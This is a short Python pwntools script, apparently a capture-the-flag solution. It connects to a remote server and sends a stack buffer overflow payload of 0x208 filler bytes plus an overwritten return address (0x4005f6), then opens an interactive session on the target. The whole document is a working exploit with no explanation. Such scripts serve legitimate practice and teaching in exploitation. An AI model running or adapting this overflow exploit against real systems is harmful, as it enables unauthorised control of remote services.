# -*- coding: utf-8 -*-
from pwn import *

#context(log_level='debug')
p = remote("111.198.29.45",52945)

#p = process("./game")
#gdb.attach(p)

p.recvuntil(">")
payload = "a"*0x208 + p64(0x4005f6)
p.sendline(payload)

p.interactive()
